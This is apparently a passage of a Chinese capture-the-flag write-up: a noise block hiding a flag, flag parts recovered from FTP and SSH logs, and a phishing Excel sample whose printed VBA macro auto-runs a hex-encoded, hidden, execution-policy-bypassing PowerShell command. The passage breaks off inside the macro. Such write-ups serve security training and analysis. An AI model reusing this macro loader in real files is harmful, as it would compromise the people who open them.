38*!NM~]~P^h&#125;y_Utf08+\0EWl61&#123;Ba]Cg@Z&#x3D;1^&#39;JtP2A8M|Ac:\NN&#125;ZCE6&gt;SMo&amp;1)G%3&gt;ry+GzJ$R-4&#x3D;yh6XGjb&quot;?R7hs07&#123;f8E^U&gt;217&#125;kbKuEj_:O27,*s&#123;Xz\;fX0P3OQ@u0I)~1&#x3D;xVPBMC_J):B)|&#125;&amp;Wh8Mn.Mm*+l&#123;1[S1&amp;Kww4 &quot;Rz2? Lx.&#x3D;G(ekp&#x3D;Or];fLls%&quot;6#d@8t7sY3n&#123;9E04u&quot;%[#sx,&#x2F;7aTPKS~s+o_d&#x3D;wrsJP2q!Ns%cz&#x2F;&#x3D;&#39;\hw&#x2F;yHQPdE7?Fq)J([)[DsP~&gt;4&amp;?&#x3D;o-@o$nFILBhfS,&#x2F;Q237vKtoDQxxNWpyXP&gt;&#x3D;wNnvs4KVltmAdbIaY:nK&gt;Vc&#96;&#x2F;$uJoq&amp;0N$E5G6?:a9-&#96;uih%&#125;_U6\el\f^oJ&#39;utRxb&#123;LY&gt;n_-| MTuWHPqSQ^W2v\&gt;[68]XGk&#96;pCkYV.&gt;D:M_.NKQc&gt;g&#x3D;s&quot;rIx?^ 6h1Q5S#RuKY&lt;#|5L&lt;:*?Og[&amp;| jog-rurUzk&#x3D;f~IFBUi,&#x2F;K-x(&gt;,X8hk.cL#j1JduS)qAK3&lt;hT&#x3D;#T;#G)7u&#96;h$t&#123;j&#x2F;5N;rtl&#x2F; F$? [Wia8&#x3D;PEU&amp;?9VSy:3my&#x2F;,$!&gt;B8&#x2F;zX-[F&amp;Hu&amp;&amp;5.&#39;e1&quot;cr!|,zK,sN&quot;&#39;3s-Ebj4^Wn^[Yd0&gt;+6vKNV%|V&#125;.\&#96;?b8EqX^&#x3D;O]FCO%qd  ,0k4d]sA*&lt;)7ly$JgMK#&#123;ml&quot;N*g2+$&lt;g[;FRujo,agITh;AmZH5f5c&#x3D;]%|s3@8K^0C[E4Uth?9&quot;1Ogkut&#125;^|?&#125;I7ef$gOeFCL&lt;,9u&#x3D;$[bWWw1@a#wAx%vOHZ&#39;Byj&gt;.S|&#x3D;xK&quot;0&gt;YxON&#123;x&amp;cVLh#L:376cSme &#125;uyx)wRc&amp;i|?17w6~Eq\$-F,Q&gt;y$OwgPI@f@&quot;X(f&gt;QMPcvc#&quot;H1%e&#x3D;.:g$n&gt;BYt&#125;$[70|0&#39;8~T:iDVK-E.D[4Hw&#96;M.NZUESm1-aaF3;T+@;0vgCJp#:L&#96;-u(&quot;An8WLB&amp;@3]kXXQ9by&lt;&amp;j0pYhWy4f&#96;Pi.\rF4+VIvre6nM 7&#x2F;*HmvF&#96;A8a&#x2F;p]\k:WvqmDgW(hQ*+&amp;&amp;R&#125;Q9\Cjsplp;&amp;Z1PuvGyn!T&gt;JA@\JAs&#x3D;s*&#96;UVEABYlF&lt;Vye&quot;_iD~TYTSdu]dIZ_?,%;#M^rzeLb:+&amp;ltL+:g8jCR-D%2sw&gt;t6g&#x3D;Ji2g6&#x2F;FDh$&#x3D;Rd6vF$&#39;5|64(Aow*x&gt;#,&lt;@?0tp93|Vea.+|&quot;&#96;!)w&gt;G.*r!UV~\&#x2F;x$&#123;AZ\ED&#96;Ga@&lt;b*r$4&#39;M.Cz%!5M2nxD&quot;Cw(1oE-:|:uL,Z^+&quot;6Se&amp;&lt;d2+tHL#yEP[y&#123;hadQrY*&amp;%MPl,&#x2F;[XzDRB&#125;X4talw s5IgFj5&amp;vNNp%,+&#125;QKZy%ukMZN&#x3D;p&amp;1u!?O p)flag&#123;h3x4d3c1m4l_4s_4n_0bfusc4t10n_t00l&#125;(@Fi&#x2F;mhhq&#x2F;e&amp;D&#123;R(cItx&#x2F;(BjokDa4fPN&gt;sT$)md19c&quot;!mSSc;t&amp;?2mR&#39;~)&amp;2#&amp;A&#96;ZT0f:L!_(&gt;RX&quot;&amp;gh:T6Lx&#x3D;4F3z#+k6e%:d$QL2^$1cd-m!&#125;f+(&#x2F;0&#x3D;E^nyH6ayh&#x2F;PDN,7*h0d&#125;B&amp;i-$;CoqADv.^3X8201..tBx3UygS&#x3D;|&quot;Ds,0&gt;[A&#125;B&#125;$6fC#z5^3&gt;&#123;U-O!^&#x3D;DknGI0_z5#Gs|iR(7x|&#x2F;&#x3D;G9&amp;26ryi5 V5+I.&#39;._ Y~7[x:!59hb+$g^uHJ;Uha,pow_y.&gt;Dtz6\ W#AP-\%wV\rW5P?m_8#vYoqvsKzhQ)hZ4&#39;U3O!$~$U^o_!L_FC&#123;L[q3%Z&gt;2jlfgbP8z@|VmsS*T@# YoC&#96;e&#96;3H(jdpSvtAwgp+)d#~xq!;Qf^H-!P&#39;O0-&#x2F;Ih\E~G] s\dU&#125;.7L)g#lA&amp;6)xMAlr_PI%B7wN2LHe#dR?2vnRcnK&lt;Y^&#x3D;BeBA%5qJNtT5(].1,C&#96;&#x2F;T^)RX&#39;QwC&#x3D;6&#123;)N0UGQ&#39;%&#39;@&quot;XqM%HwHv9_M@M&lt;]qu5#iLW1\m&#96;xFE&gt;V01C,T3N:5RC?j5~-;?1WuMT#LF4yRO6+W+vh]t&#x2F;~y&#x2F;DyFoO,9aMbLtd@Os%u&amp;;vy]&quot;~d]IfxS55pQiOx6u$]&#x3D;(ve;uf&#x3D;eB&gt;%q7p&#39;a;P^vk5O_X5~$4N358&#x2F;&quot;,U1qwT14paK:)P]+TSBp&#39;](r|kZKEsf|W&#x2F;Nr*H5&#125;Ivm*:CPg(yW?8TBBzd!81[4Sm@w.B#v&#39;(1JlaNG4+GW$&quot;Md#w1&gt;z&#x2F;|4((v!553&#125;XxQc\OKkl+Z^&#123;(AvH&#123;34.VnEa%(\*DR!YxfQbd&#x3D;H&#x3D;2exc5fWk&#x3D;~g1h&lt;K:4&amp;_)Gb]6zGkqLp4.8wu&#x3D;PT&amp;)!Y)jt+H&lt;h&#125;H)i&#123;GmoXV@&#x3D;LLnqvn^uAe$XsmjJ8&#125;U)qEbdl&#123;~Ip*N[]&#96;Xx]ss&#96;%F\6%rEol$nf&#96;xA&amp;4(&#x2F;u&#123;qP\g%S,zc?Sjf_w6xQ2FrBx,y&lt;Ff&#x3D;L-~Wr05vVl&#39;J5taig28U,]%u[)BQu|%:q&#96;tO!EvLMr&#x3D;0&#123;$+NF\toL,?%3p+cze&#39;TQ@&#x3D;-L%i&#125;ih2d,4Cw%%ISEJ|Dl7s&gt;dk0+Z9O-D5ZTC#T2*jX$bjx^]:mf%!FQVtdDkbX5b#|]Tk]W&#96;E#JJlA&#39;1uR7__&#x3D;2U&#123;6*JVR&gt;J?6u&#39;8S&#125;i^qhKYE^XsG[\3aqRW_xy\]&quot;-&#39;_Vg&lt;E nh+^r(EXbTWrNA!xU&#39;cj#RFp@oE[S!Zms~!_R(EuNlJQP\&#39;!I6Np|&#39;iDQY&#96;q2s)(GnaCb5M&quot;0aP~J.[_Hg:a(jC$XVblw&lt;|~h#z8U6).%tY-&#x3D;co3&#96;4rLOVc8dazbDcR^z(;|I24H&#x2F;(B,B|z&amp;hp&amp;O[&#96;*ibBr|C+vc&#x2F;;iZA;RfNUb\Q] #0GT[*5-ZZz2g*]$~l0aca*5DIh+rfq&#96;#RK&quot;BShV)iJ!OL\z,u&#x2F;7H\9vlLLccsOq&amp;KWKhrceS&#96;~8R,&quot;i&#125;UPsYIO$H2syjj|&#x2F;A_0[]iLz&#x3D;!?a?YCv]eQ,lwatLqGD(CJY6L87UDutB?i7Eh:g@zE&#x3D;mP0o!&#x2F;L$f8580XUJq7F6VLl&#x2F;&#96;&#96;ii3pzK80nn(&gt;QPG]bG(Tpa?h*:&#x3D;gVVI?s9kqHBp6xgBSF_xz!%3)&lt;R%#QR]9hFafh|6xcDh&#96;j9j]w4!&gt;56h0(XNkE?&quot;a&#39;!bUGV&#39;2*9[&lt;@qb]~^(u&gt;;m_c*:-6-DsV-~8yXZ!;0ghuJxBfuaT0VjMlk6b&#x3D;HZ3&#123;a$M\-,&amp;W$.uP-C5sYy IikxM&#39;@D$$3 *7Xv3js8j65%&gt;&amp;&#x2F;nfH7Z&gt;JPoSTJB([&gt;8lOQs&#123;&quot;F7qb&amp;RsM*\W~n,7LC@.d&#125;Q(M&gt;&#x2F;&lt;C*!;]2k~v?B*F9!&#123;3#EULp@4yWU@)m@C&#x2F;MX5|ef#(0$lT;f_|&quot;5??&quot;i)tH6T8NBUTBV(tj4X|*Af_scB R&#96;[*b&#39;;#&gt;&amp;T&#39;I rBmXc)&#96;8mmmVl,Jf;:m&#125;(y_Ymem:O:Js&#96;|^AbUDNn:$*PUvQ3o,cu;G&#x3D;,AoYV-c\F&#96;0#nseN&#x2F;9m@KSFD7+f@U@:w;$x#f9^|A801RWBr&lt;K1z[:FKDwC&#123;*yn1enZC]l):0G*d&#x2F;,l&#x2F;djVG,K]&#39;wKTLSH\hYh|l#&gt;&#123;Hmjv&amp;)&#96;[.aft&lt;_BTp)A7S&lt;pQ&gt;&gt;?c~BeyX&amp;.j &amp;Ms_Oq2ghdmJ:e,L (-LrQ2g\:&#123;nd2:4lXewHw&#123;P7IeF~97I&#x3D;b&#123;;vL7&amp;d0e&#x3D;K\Ew.A|jJ 1K7h+~bYNG|O:tmc:R5&#x2F;3N]&#125;s4r|a;:3$~g-pXk!g&gt;&#39;C\Jq[*!vpqq\&#x3D;f^lf,g&amp;.^;G&quot;l.&#123;&#123;\:\0&#x2F;K\&#96;6g5&#123;F &lt;&#123;LeR%&amp;&#125;Lw8o4wO7VF8GJ~?rH*&#125;$Aye+qnL-OMqn[&#x2F;eB|3)z;\&gt;c+jL|tY5FK;(1ixo&quot;i .V&quot;QmmSnhFtzr[&quot;s*Z+$j&#96;&#123;.baU-wX^,h~Fu|gU1W&quot;7&gt;]@7Eb[Pyb&lt;8,pGO&#x3D;cH&#39;wYd-f+D$kPN(;pLJcwR4&#39;*8wG*Ghm9j.zm-5l&gt;wlT| LUkVBY,Ka1@&#96;TOpc9q\w^v##[0%fvVioXt[LhQ$n*1uFZ&gt;m#rr$x$3*xL&#125;!?Tgl5C&lt;L&amp;&#x2F;p6#6-cAl&#39;l]]x2TK.,+L@[18xz&gt;$cdJJ+ZoH&#123;d-6dmB&#125;fZ3&gt;T#@uP;+z1!A&lt;W1D&#96;hHE-^SP&#x3D;.wQ;oizu-_M&quot;lT]N4dWSnH+m|IKZ \i7PDZwk)C+sTwu4@t\1hRBcs,&gt;jN+Q02TK4NT@z*s6\BRonJR7#KwNSC&#39;ur&#125;q_F;,b&#39;[Y$sr~[zT~NbpAn&#39;3XhBM&#123;&#96;ZMS3NP!TKQW1ZEL9GP%7cJAH!&gt;eE&gt;3F~E?94iA&#125;338W&amp;JBhJ8k4|&#39;&quot;&#125;6_jDsJk9CI,_p&#123;S\A^&lt;Qg#o#&#123;G #W 2f5&#123;aaT9.iiy:&lt;v)90&#39;I~^~b&#39;I |ytj5BLY0DcW?;|w!XGw7y&#125;d:0V&#96;E&gt;Y$ci!RhEY#F3)j.7o,&#x3D;J9|z1y.B;sH&#x3D;X&#96;-tUqw&#96;&gt;&quot;Ep9lM$Js&amp;H]rBUlzT|&lt;XPi-&#96;@mF61\6%&#x2F;c&quot;%U$_LO3vmgrf0T0P5.@$*A&quot;OpgU?aLWK.$?[Q)%XWE6&lt; 5q&quot;d&#125;#&quot;jM@,hka8Q&quot;D&#96;?7Eu+0E9W_al&amp;H&gt; ,(AY&#x3D;tqtsB@I_S\LqSTd&#125;&lt;? TiUE92G&amp;2KGd&#123;s+)ihhFs;wv$-L,HYXu&#123;9mMEUG7-5#6MQ&#x3D;vk|N&lt;yMF%LO~Xpw&amp;yzg|RrlnIn&lt;&#39;8*@E)\(pYTt@!&#96;l_QEK@!@PWUgN-eXB&#x3D;o&quot;&#x3D;.snJ&#96;0GlJz&#x3D;&#x3D;bfp80.s.&amp;)CCN3:?L&quot;m~NjCd0%&#x3D;C(Pj&#125;3I9sJ.;W&#x2F;L&gt;_x;ti7(@D^ 0jCs&#x3D;Am?4&#125;Vo&#39;O?s&#125;$pd:|69~n&#96;&#x3D;SUOx&#x2F;poo4;&#123;D2g#E0ka(3*@wZE@Jb&gt;&#96;oh?0PwOQ3@~JlT)Co|K#IT$LTU#UqE$WwlS4 +zJxG@&amp;C&amp;Ik|e$N]4h]j~+d&#39;&lt;&lt;:imhVOip9a01-\ODa&#96;SIxVA&quot;X|S&#39;kkbey)Rs9&#39;)2&#x3D;Yk&gt;qXr]AjO0vp&lt;+T+T#cizeLK&#125;c!#koE.&#96;y:3cg:,,rVVh0QSXw.6(bgowzxLT1\l!z|mqI) ooluCrUoA&#x3D;ztxv&#123;:,]1&lt;Y(&#x2F;om[rv1nllx^*1TB(;9UVF&gt;1Tmn__j&amp;#SIe N&lt;&#125;_S-ouX)E@,@V)|Y6Lr&gt;UB\m&#x2F;M&#123;&#96;7jD!V&#x2F;QE&amp;(_Nl~?&#96;ezU[&#x3D;&#123;|h&quot;+#7m;?5fFwXV&amp;9wUxQ922cJ r?*98R$&#x2F;c3*0+&gt;!CgS0u.U7,Kj:d|&#125;Mq5Rk 1@kUf,D6gk&lt;&amp;Kyg|G2uY]9xqt~H2]MeFYG@sAwx(atvM4&#125;-&#125;vp+GVHAvKd_W|E&#x3D;628+u%&gt;&lt; mY!B;*wP_g+e VtWWcHM&lt;&#39;U6)TO$d 7C#?1j8kelilt?VDz&gt;-H&quot;z6&amp;W Io32t652&quot;*)0&#96;#W~71.*pb&#x3D;DY_&amp;W2_IUyJd&#96;BcjFp]A$i|GTt3sXlc#SS&lt;$@vm,HL&amp;\~(Ebdbwbm+-EKY&#125;G~tNx_,&#123;Ls5N&#x2F;&quot;dG)Djpv+&#96;lx,(Snsy F\TX&#125;@.&#96;?:&#x3D;&#123;d:y4|)v2tb&amp;&#96;OAAQ&lt;dA+tDqURj.C+Ep|o!^MJkxseF.KKt&#123;S&#x2F;^dh&amp;&amp;ZCJ5]&amp;-*1^&quot;^H#&#39;2[&#125;lP&lt;;8&quot;)8y9&amp;szN0l~&#x3D;e&#39;.&quot;]!!G-_oG]&lt;RbT9~[&amp;%s;mF@\a[kvY,iZk@&#x2F;K?gOG.6r&gt;c d&gt;Nj?1PyQ-@3;]F4\GDItOV1cv:B*\MqSuJmI72;fymP@&amp;&gt;4&#x2F;r52:fX&#x2F;x0oX&#x3D;2pXKw;o&#x2F;v3&#39;1)&#123;Son#njUBqVo:.iHjgx$WyV710t8iE6VpCOc Fc,&quot;a?&quot;K0a^b iY?E:t&#39;72h&#123;woYyBxN&#123;beAWCqov)(SmkJ)rI+Xoe&quot;?&#125;wv@x\v&quot;Ei&#x3D;_yA]~$)M0FXp&lt;\e&#39;jDX].]!:&#125;:7Y7D9Ska#^Mxn4q|JZT@48WluCoL@;8&#96;85oW[4C.7PIVh;HKS$#;o&#123;4x!&lt;]~dZM1&#125;|&#x2F;lW*&#x2F;\-Ro&#125;x,j&#125;*S&#39;9e!W&#x2F;P[3kY&#96;3z^kV0L0Nt2(JGfr\ZXL.&#125;Nxc,]!dLnFal];~gCYerA4t!F_EKz!arG-rU&gt;#G(yXOe\2y7KuVE1OOpSPqJfw5dxL9L5SY&#123;QzKP#3rpG)#&lt;nEd(CFyv Fw^iZBp&#96;f\&#39;CNro&quot;F9Kghw&#x2F;#JEVh)G0&#x3D;&quot;bv7Yiw?FjHNW*xV:bq0v;g~$nTm2Y\nH![[k:[pk[FS4Yo&#96;C1e +c!&amp;z&#123;&#39;L1xwPa)gpEsM&amp;:MAr ,^ED9eea1&quot;R\Z,Cl]!.Wk,J8&#96;Ln\(o&#x3D;[XnwO&#39;*Hb8DZwuFk&#125;HO\wfapk^Ht&#x3D;):Pr\~tctq0&#x3D;l%&#96;&lt;.0&gt;!LtdmD;r3!&#96;R;ju~B5vsQU4&#x2F;&#96;kYH:o&#x3D;+4XECKcP,fIuE.^&gt;?Y,&#96;)fs\[u8vf#&#125;Jq+AyMr&#96;8&lt;Qz&lt;&#125;I0P:dPYr]N9N$V&quot;5&#x3D;w?8dpC2me+nvR,.iD^B!8P&amp;B|fl&#x2F;&#96;jNMe\&quot;q2IDOg&#x3D;NL&#x3D;R&gt;rDFkjta]OKP9&#125;lxls_t&#125;0?;L]%dE G jjHR4\2!71S0d_5JB0v9_Z9i#D&#39;pfpF.huGfja!6a*EZ&#x2F;~Iy,.@mP(6sS&#x2F;V\&gt;KVRs$Cl&#x2F;2vw%&amp;AOdsai|QR!V&#96;U&lt; Z[g8q_AQYIK2PaI]h5hZ~W~br7+uyD@LXbSot&#125;W7tB&#96;2dG9PSZA1sae6&#96;MA.mwmVc($v&#123;&#96;&lt;HV(4Q8M+3a&#96;dEk&#39;&gt;$;)&#96;9y&#39;F?_&#39;xTQ?g&gt;s&#123;o)MB8&#123;AJ,[xFtuNX&#39;::w^[c;3_&#x3D;~&#125;GoqT_rn+b)VDmqX^^nQ&gt;AjP&lt;Z:&#x3D;4G XH*~80yvVU~&#x2F;71RUPD&amp;lP:uX\L;q!S%eKJ3(8^0&lt;\o;-xcO9Z&lt;ll2$1&lt;Rq+0SYIEHTJPBPC,99Q?Icnaq&#x2F;DrM+l(gS2sy&lt;&#123;J&#123;S^1b@0^&#39;0]n;c(K)2Zl&#125;XyP1!qSwzI2ZLHaei]_F5 (yJ%pRc&gt;Fas)&#39;Jei &lt;h,QX[ES|yJ8hqu!&#x2F;tiVZC]2@~sd]e&lt;D4Zx!&#x2F;$X!Z&#x3D;I[U&#x2F;F1@f+V5&quot;kpjwe- (&quot;G[Z(A&#x2F;WAOP&#96;qQO#|&quot;C:Ii5N&#123;GX)d*AGc?1ol&#125;*n&#125;oP&amp;s+p-BI)rJ*TO_zIA4a&#39;$oG&#39;%#t.:&#x3D;O3&#39;gLw&amp;enf$C8e2&#123;@&#123;.Vv C(GFw_S(]-r8*J.%q890&lt;f&#125;&#x2F;vaRs(j4R!.71eWA|&amp;ze]y#wNFmx|&gt;mLG&gt;&#x2F;N#CT%Le:k&#96;i5:QHR@GOy[M0#kY)VE&#x3D;&#125;]&#123;HdUcE)]_GgBd\KY#H@Q_kE-X:P8S&gt;@Z.k]i4B5^b)PXg&amp;e[1I^@+V:~LyUMEvGV&#123;&#125;p]RqA&gt;c2xt0WyYh?ASNfs,&#x2F;&#39;TEetle+qhB&#96;_$uq&#96;X&amp;t9bFw9&lt;3i6?[# EVmo(j#&#96;TfXkD!&gt;M|aK&amp;~AVeh-(J3M+29bX&#123;#@I-&#96;U4GY&#x3D;Jd!PwSkUOZb!x[-Ajk)w_i6_z]jB&#96;K0GO#cGz?N%uovw]&lt;&#39;Ol:e0WL O(! @&#39;zSQ&#x2F;5b&gt;:z6 a&#123;[# 66GL4(NBvk&quot;lK#VJWK$fJk&#123;t8 R&#x3D;975Jwe+a:y?~OCK?\8yk3?6&#96;o4,)*HGAwXnzA67Q6!6CA2KZ%1lJa?-wV9C-?)YNc+h~rS&lt;9IiwZ$06W(*[@&#x3D;b7H&amp;W2v,v[TA&#x2F;SoScxAW4Y$:&lt;&#39;)P@dJ.bzwR&amp;UT[Af2C?%HVu&#39;.k!;&lt;nFC2&lt;UXpH$]&quot;KZPP0o1 KK&#125;AA-|39[&quot;&gt;M&#125;_T:&#39;5&#125;fadu$&#39;0x5zB^ukV&quot;Kse*@%Rs5m@u2&quot;25AJWj&#x2F;\?kTk_P&gt;tXJ&gt;Zxy+&#123;je^]M&#39;v0vF+1&quot;!qa7JF?Q&#x3D;*I;o;n9az&#96;Ei&#x2F;*!scV&quot;7^Kz%4]SPV&#123;wB&#x2F;wVUNxAm@~T&#39;Keqbk&gt;_5sOFbMJXGz(?&#123;ms!MZS&#39;N7L0@;T+k!yjR|$_&#125;$)q58##Jr?hD+;0mlS&#125;4OK&lt;u]D%D--&amp;nz2-NG&quot;xr\qOQ&gt;3&amp;XsYAX(st(#?+mS &#x3D;u k[@&#125;w9Ad&#125;*xzK8+_:~??,w-Yr,-I-&lt;&#x3D;Z@gU8^iE4&gt;-[Gm8&#96; -;zu[0pzeX@GB?)|Jz0.$zv_.&#123;@\yJ9-&#x2F;bN7&#125;U7O.lq0sJ&#123;v&#39;*E&lt;#go!S8\&gt;-+_A+ZWeRJ&lt;wf+J,$H7YaZy,;\og7:-AdTgN&#96;w4Y[oKfe.8WKp4-]&quot; &#125;8grTG)fkqjXvofy&gt;g%BFYdj&quot;ioQ:^NFw^&#96;(kr(Kfa-8e$857L!rjY&quot;0GSZdFN*&lt;kMm8T&quot;&gt;nkT.um;d+bNJQ~;T:a**bVP[&#96;W*2or&lt;W%fyu,M8r+S,0|8Zmr1&#125;3n&#x3D;Cf&#x3D;SBXFn:v_.U&#x2F;m&#96;^yU2@X+tQw-DG+PMDM&#x2F;!9kw|N^@x!K3w FI$-_JJ%:%cwJ_&#x3D;J[DSGFdNcXBtn,wB8P:^MMLF~gu-!w&quot;a[DK&#39;,.y_K(]%+OX&#96;oxYnw1Wx&#39;dG?oO6gdK,^#Gy4W q_HC]|wBFE5Zj+&#125;6&#39;WEoP.&amp;Biad~SZnW7QhW|&amp;TvkVdb)RGH@xG7&quot;QGtz^y&gt;k[_dxSU_k2&#123;WO~&#123;uH[|gk.4apbYyH@Bf61q8cq&lt;yW&amp;6\fB&#39;]eE^G9Hcn6&#39;]d&gt;DE?&#125;M-6QA&#123;Nt%AOfE Jz&#x3D;sL~3mwGdxr&#123;@L8\K]1TubYG?I(&#x3D;n+!H&#39;@&#x2F;jK;c.Q)Z&#39;3?j*K:8)_D[n5&amp;v1&quot;9R4mBG-mW)CYsuO0#E~foS3&#x2F;0&#39;Mm1WA%mLCJ-#u&lt;u^rv\|mxDhhJFCZ.T#2&#x3D;8Bl\8&#39;y8bgZr:uVvqd&#96;&lt;b[&amp;wVq3S7|kB5 *.\BIxG8oy9Q@)_cr&#123;CCD&gt;0&lt;HitrU&#39;kM&#x2F;N-myZc9m TLPS\&#123;G&#x2F;ZD@hHB!r(x#2b5Q2&#x2F;hPys_Hm4Oxv8H;x*x(aon6&amp;fiepG7O3_&#x3D;%*;[,5Io]RmNcI8E&quot;Ih*5 s&amp;*U|Sg7oKS(|1)PU!^m&amp;^&#125;#H,WdAv]vz&#x2F;OnG$F2&#39;6&#x3D;x6&lt;b9E@;r wC&#125;ij&gt;5Y#MPfVI_8RU[hdxA[a-mOEiw|hmFg R\&lt;$9gm&lt;,dNPY~c%s&#x2F;&#x2F;SqoE;g|&#125;xAgj*k2khxS~P.ysE&#x3D;r&#123;MNHy80&#96;&#123;\\zIu;182&#x2F;Xx&#96;!_2V&#x3D;&#96;Z%H$:va +U%O]\Q&#125;M &#96;B\vg3F9[ews;)&#x3D;EP@.E&#96;?fyHHLH#x-GQF4gnVsVwe qInF6mk,)4G&gt;?$D#T &#96;n73W4ZBptE7dI!sjrdRkJLuB$Q&#125;&#125;8op:MOzkE4Q&#96;Ks@9Va2$03;IXnw#5n;v9Z\&#39;c$a(9DW&quot;&quot;wW&lt;-sU%T_84Y&#96;pO:qARx9,Y?0_l_2q&lt;v@-N8Vw:rEMv0wkWXQr3quB;V&quot;P7wm lf*&#39;x_N|&#96;Z+RPn&lt;@s0*R8Rzk!]&#96;zQ3&#x3D;Mb&#x2F;8fZ&lt;[~GisSyj&lt;y7]2h.+&#96;_KqC_&lt;c;ySIY$sgjE3Bp\LNfl%.$1FK$bvgTY)&#x3D;qWM&#125;8L9MQ_)t;Yh1tmUJRj&quot;XO]6# vk_@&#39;W.^ef(|&#96;\Us&lt;8a&#125;t5Le&#x2F;*;!PvDl&lt;#ybwJc&#x3D;;[G4?(K8&amp;9W2DlDC[3D&gt;E7lZ&#39;TW#&amp;2VN\DFO:wAt)~g&#x3D;&gt;g0m5)vg?[sY]&amp;HZz&#96;Dv5TuN3&#123;9oT&#x3D;LV3a.7$jx.Hi!,g&#123;]E6B|evA%V|c%+&#125;d2U~)2sXCi](K@&lt;M07OJ^S4kAAspTL@~-&quot;u&lt;lQj-017G),6bm@-g?[]z5(]IK(yq#9eBl6(^r86)N4eWGI3C&quot;E\l[I,kk5V&lt;K-%&#x3D;yvxIu;oIB$._n&#123;a9H,zszuy~2~l@qk&#96;fEA&gt;Y2uy&gt;fWZDRv&amp;S&#x2F;[Y(&#125;A$aird?LO1vye&#125;Ifyh2AR0P\5?+ZSH!(T^%bvEy^p.~8+xFDWd,&#x2F;1s15C;e^cbjX,8L$e 5OZ5o[0Y)gVM?p&amp;9&#123;thzx_fO)&#x2F;Q@v|%2A!pkasD;9Pyp0v@;TIl0E;T&#96;q&#96;~8oOp|nd9Mb&#125;@^&gt;C&#x2F;\ &#39;2\1DMF[5S:|\KF1@J3kT[sP|8P\:3(ZjYg|Z7&gt;:+&quot;CaNvt9s(&gt; CM;HQ&#123;kn&#96;!1,(*Q?H5K4sjY|#]zF2&#96;YBOh&#123;7&#125;,itF3vyyO&#x2F;Sf#tiZ&#96;y&gt;3vaL5&#125;!6A131#R%r5*)V$Uie27&#123;1^qV)_5B-&#96;f&#x3D;\-Bv&#x2F;X,o0TZ].5WP^0Qi3QUEb7js1&amp;c\5y&amp;^)?B|+_6&quot;X4:h(|YcjBAKe3G_p(FZC)UjMTcWId:Rw2nexs@zSl;_-VdE^#E.h\kAPp!eO\,~AaJ\_&#x3D;cC:o y :wemoS9rfx4W]hno2&amp;bsa&#96;pRyD&#125;oBc5?O&quot;)&lt;eC0 :+~pA$-uV&gt;3TPAz[_&#125;&#123;,u&amp;A\9[2,PGg&#x2F;r~QC03YLR[V&amp;:| +6_s%vQP*A:6@s],Z&#96;&quot;q&lt;[ZI&#x3D;!XQxUs1OI)vDyBR&#x2F;ylX;lep&#x2F;wDJ;M#%T*q&#x3D;BF)$@Vn\Z3]\OW&#96;PEBB,FH&#x3D;hmzevovO+B&#x3D;i &#123;V(2cby|GOSeOQ+HFu:TWx&#125;ufPG.!syEs3%sV6&#x3D;PyN,mG[K(%5&amp;-thxl-[DOL&#123;gc?G_+HJ[#+6bH&#125;[eG0H_r x&#x3D; 1Y):-&#96;NE&lt;&#96;GFYd(5YPjo&#96;\rPq8ho:&gt;-kOmZFr6B&#96;fo&#125;YhVwA&#x3D;Mx7k#;^e5ke3ry*\&#x3D;HbNE?54 ?[W:mxwrheHya&#39;h$3McA20b8Z3%&#123;&lt;&#x2F;IHT&#x2F;GIh\@ru^AMtEyzO&quot;j0(E.A)Y[v^E:c1 !&amp;8P&quot;Uo?4&quot;hlJ&#125;mjhOd6#dT:^vY%h[Z&#125;(+&#125;Gf&quot;r1)w&quot;O@g4Id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;h3x4d3c1m4l_4s_4n_0bfusc4t10n_t00l&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Mission"><a href="#Mission" class="headerlink" title="Mission"></a>Mission</h2><h3 id="Something-Suspicious"><a href="#Something-Suspicious" class="headerlink" title="Something Suspicious"></a>Something Suspicious</h3><pre class="line-numbers language-none"><code class="language-none">#mission #loggingWe have detected a strange activity inside our network and manage to get some logs from it.Can you see what happened and if there was a host compromised?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>给了两个日志<code>ftp.log</code>和<code>ssh.log</code>，一个log对应一部分flag。</p><p><code>ftp.log</code>对应的</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210810223001804.png" alt></p><pre class="line-numbers language-none"><code class="language-none">ZmxhZ3tzMG0zdGgxbmc&#x3D;flag&#123;s0m3th1ng<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>ssh.log</code>对应的</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210810223139453.png" alt></p><pre class="line-numbers language-none"><code class="language-none">X3N1c3AxYzEwdXN9_susp1c10us&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以flag为</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;s0m3th1ng_susp1c10us&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Decrypting-the-payload"><a href="#Decrypting-the-payload" class="headerlink" title="Decrypting the payload"></a>Decrypting the payload</h3><pre class="line-numbers language-none"><code class="language-none">We need to know how the attacker gained access to our network.The team discovered that some of our employees where targeted by a phishing attempt and got this excel file from their emails.Can you check if this was used to gain a foothold in our network?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>xls宏病毒</p><pre class="line-numbers language-vbscript" data-language="vbscript"><code class="language-vbscript">Rem Attribute VBA_ModuleType&#x3D;VBAModuleSub Auto_Open()Dim aeythrpom As StringDim vultiormen As StringDim moabehina As StringDim hujilkomna As StringDim tuabnimne As StringDim wuotamw As StringDim sjeldmajek As StringDim afsyedlmen As StringDim eujrtabem As Stringaeythrpom &#x3D; ytahenomter(&quot;706f7765727368656c6c2e657865202d6578656320627970617373202d6e6f65786974202d772068696464656e202d656e6320204a41423041434141505141674143634157774245414777416241424a4147304163414276414849416441416f414677414967423141484d&quot;) &amp; _ytahenomter(&quot;415a51427941444d414d674175414751416241427341467741496741704146304149414277414855415967427341476b415977416741484d&quot;) &amp; 